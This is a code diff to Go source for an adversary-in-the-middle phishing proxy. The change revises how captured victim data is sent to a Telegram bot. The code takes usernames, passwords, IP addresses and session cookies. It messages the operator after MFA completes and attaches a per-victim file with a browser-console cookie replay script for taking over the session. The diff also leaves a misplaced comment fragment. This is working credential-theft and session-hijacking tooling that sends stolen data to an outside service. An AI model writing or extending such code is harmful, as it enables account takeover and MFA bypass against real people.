@@ -230,7 +230,7 @@ func rewriteResponse(resp *http.Response, upstreamHost, ourHost string, pl *Phis
 func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie, capturedCookies []string, upstream string, pl *Phishlet) {
 	telegramOk := telegramToken != "" && telegramChatID != ""
 	if !telegramOk {
-		log.Println("[telegram] bot not configured — skipping notification")
+		log.Println("[telegram] bot not configured -- skipping notification")
 	}
 
 	// Extract credentials using phishlet's field definitions
@@ -284,8 +284,9 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		"source":      "proxy",
 	})
 
-	// Always notify Telegram — different severity per event type
-	if !telegramOk {
+	// Single notification -- only on MFA completion.
+	// Page loads and creds-only are logged to JSONL silently.
+	if !telegramOk || !hasSession {
 		return
 	}
 
@@ -293,50 +294,23 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 	ip := r.RemoteAddr
 	ua := r.UserAgent()
 
-	// Severity-based message format
-	var msg string
-	if hasSession {
-		msg = fmt.Sprintf("🔴 FULL CAPTURE | %s | %s\n"+
-			"👤 Username: %s\n"+
-			"🔑 Password: %s\n"+
-			"🌐 IP: %s\n"+
-			"💻 User-Agent: %s\n"+
-			"🕐 Time: %s\n"+
-			"🎯 Campaign: %s\n"+
-			"📎 Session: ✅ COOKIES CAPTURED",
-			pl.Label, username,
-			username, password,
-			ip, ua,
-			captureTimeDisplay, campaignID)
-	} else if username != "" {
-		msg = fmt.Sprintf("🔑 CREDS CAPTURED | %s | %s\n"+
-			"👤 Username: %s\n"+
-			"🔑 Password: %s\n"+
-			"🌐 IP: %s\n"+
-			"💻 User-Agent: %s\n"+
-			"🕐 Time: %s\n"+
-			"🎯 Campaign: %s\n"+
-			"⚠️ Status: Waiting for MFA — no session cookies yet",
-			pl.Label, username,
-			username, password,
-			ip, ua,
-			captureTimeDisplay, campaignID)
-	} else {
-		msg = fmt.Sprintf("📄 PAGE LOAD | %s\n"+
-			"🌐 IP: %s\n"+
-			"💻 User-Agent: %s\n"+
-			"🕐 Time: %s\n"+
-			"🎯 Campaign: %s\n"+
-			"⚠️ Status: Victim clicked — no credentials submitted yet",
-			pl.Label,
-			ip, ua,
-			captureTimeDisplay, campaignID)
-	}
+	msg := fmt.Sprintf("FULL CAPTURE | %s | %s\n"+
+		"Username: %s\n"+
+		"Password: %s\n"+
+		"IP: %s\n"+
+		"User-Agent: %s\n"+
+		"Time: %s\n"+
+		"Campaign: %s\n"+
+		"Session: COOKIES CAPTURED",
+		pl.Label, username,
+		username, password,
+		ip, ua,
+		captureTimeDisplay, campaignID)
 
 	sendTelegramMessage(msg)
 
-	// Only send cookie attachment on MFA completion
-	if hasSession && (len(capturedCookies) > 0 || len(victimCookies) > 0) {
+	// Send cookie attachment with replay script
+	if len(capturedCookies) > 0 || len(victimCookies) > 0 {
 		txtContent := fmt.Sprintf("=== AiTM Session Capture ===\n"+
 			"Target: %s (%s)\nUsername: %s\nIP: %s\nTime: %s\nCampaign: %s\n\n",
 			upstream, pl.Label, username, ip, captureTimeDisplay, campaignID)
@@ -350,7 +324,7 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 			txtContent += fmt.Sprintf("%s=%s\n", c.Name, c.Value)
 		}
 
-		// Cookie replay script with ALL cookies
+		// Cookie replay script
 		txtContent += "\n\n=== COOKIE REPLAY SCRIPT ===\n"
 		txtContent += "// Paste this in browser console on the target domain.\n"
 		txtContent += fmt.Sprintf("// Target: %s\n", upstream)
@@ -363,7 +337,6 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		txtContent += "location.reload();\n"
 		txtContent += "})();\n"
 
-		// Name file with victim email
 		safeEmail := strings.ReplaceAll(username, "@", "_at_")
 		safeEmail = strings.ReplaceAll(safeEmail, ".", "_")
 		if safeEmail == "" {
@@ -372,9 +345,8 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		filename := fmt.Sprintf("%s-session.txt", safeEmail)
 		sendTelegramDocument(msg, filename, []byte(txtContent))
 	}
-
-// rewriteBody replaces upstream domain references in text responses so the
 }
+
 // browser continues routing all requests through our proxy domain.
 func rewriteBody(resp *http.Response, ourHost string, pl *Phishlet) {
 	ct := resp.Header.Get("Content-Type")
